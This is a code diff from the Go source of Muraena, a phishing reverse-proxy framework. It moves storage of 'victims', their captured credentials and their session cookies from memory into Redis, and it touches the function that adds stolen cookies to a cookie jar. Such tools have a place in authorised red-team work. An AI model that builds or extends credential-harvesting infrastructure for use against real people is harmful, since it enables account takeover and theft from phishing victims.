@@ -3,6 +3,7 @@ package tracking
 import (
 	"encoding/json"
 	"fmt"
+	"github.com/muraenateam/muraena/core/db"
 	"os"
 	"strconv"
 	"sync"
@@ -42,18 +43,17 @@ type VictimCredentials struct {
 }
 
 // GetVictim returns a victim
-func (module *Tracker) GetVictim(t *Trace) (v *Victim, err error) {
+func (module *Tracker) GetVictim(t *Trace) (v *db.Victim, err error) {
 
 	if !t.IsValid() {
 		return nil, fmt.Errorf(fmt.Sprintf("GetVictim invalid tracking value [%s]", tui.Bold(tui.Red(t.ID))))
 	}
 
-	victim, found := module.Victims.Load(t.ID)
-	if found {
-		return victim.(*Victim), nil
+	v, err = db.GetVictim(t.ID)
+	if err != nil {
+		return nil, err
 	}
-
-	return nil, fmt.Errorf(fmt.Sprintf("No victim found with ID [%s]", tui.Bold(tui.Red(t.ID))))
+	return v, nil
 }
 
 // ShowCredentials prints the credentials in the CLI
@@ -106,7 +106,6 @@ func (module *Tracker) ShowVictims() {
 
 		if len(vv.Credentials) > 0 {
 
-
 			m := map[string]interface{}{}
 			vv.Cookies.Range(func(key, value interface{}) bool {
 				m[fmt.Sprint(key)] = value
@@ -129,17 +128,21 @@ func (module *Tracker) ShowVictims() {
 }
 
 // Push another Victim to the Tracker
-func (module *Tracker) Push(v *Victim) {
+func (module *Tracker) Push(v *db.Victim) {
 
 	// Do not override an existing victim ..
-	_, found := module.Victims.Load(v.ID)
-	if !found {
-		module.Victims.Store(v.ID, v)
+	_, err := db.GetVictim(v.ID)
+	if err != nil {
+		err := db.StoreVictim(v.ID, v)
+		if err != nil {
+			log.Error("error adding victim to redis: %s", err)
+		}
 	}
 }
 
 func (module *Tracker) AddToCookieJar(v *Victim, cookie necrobrowser.SessionCookie) {
 
+	// TODO use REDIS
 	if cookie.Domain == module.Session.Config.Proxy.Phishing {
 		return
 	}
